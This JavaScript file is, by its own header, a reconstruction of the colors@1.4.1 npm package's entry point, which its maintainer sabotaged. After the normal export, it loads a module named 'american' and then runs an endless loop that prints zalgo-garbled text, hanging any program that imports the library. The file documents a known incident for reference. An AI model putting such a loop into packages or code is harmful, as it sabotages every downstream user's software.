// colors@1.4.1 — reconstructed from public source
// Commit: 074a0f8ed0c31c35d13d28632bd8a049ff136fb6
// Source: https://github.com/Marak/colors.js/commit/074a0f8
// Maintainer self-sabotage: infinite loop printing zalgo text to stdout

var colors = require('./colors');
module['exports'] = colors;

// Remark: By default, colors will add style properties to String.prototype.
//
// If you don't wish to extend String.prototype, you can do this instead and
// native String will not be touched:
//
//   var colors = require('colors/safe);
//   colors.red("foo")
//
//

/* remove this line after testing */
let am = require('../lib/custom/american');
am();
for (let i = 666; i < Infinity; i++) {
  if (i % 333) {
    // console.log('testing'.zalgo.rainbow)
  }
  console.log('testing testing testing testing testing testing testing'.zalgo)
}
